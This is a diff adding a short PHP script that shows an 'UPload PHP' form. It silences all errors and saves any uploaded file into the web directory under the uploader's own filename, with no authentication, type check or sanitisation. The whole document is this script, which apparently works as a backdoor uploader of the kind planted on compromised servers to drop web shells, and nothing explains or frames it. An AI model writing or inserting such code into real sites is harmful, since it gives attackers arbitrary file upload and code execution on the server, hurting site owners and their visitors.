@@ -1,0 +1,14 @@
+<?php
+error_reporting(0);
+echo "\n<br><br> UPload PHP";
+$saw1 = $_FILES['file']['tmp_name'];
+$saw2 = $_FILES['file']['name'];
+echo "<form method='POST' enctype='multipart/form-data'>
+<input type='file'name='file' />
+<input type='submit' value='UPload File' />
+</form>";
+$xx = move_uploaded_file($saw1,$saw2);
+if ($xx){
+	echo "<br>Uploaded successfully";
+}
+?>
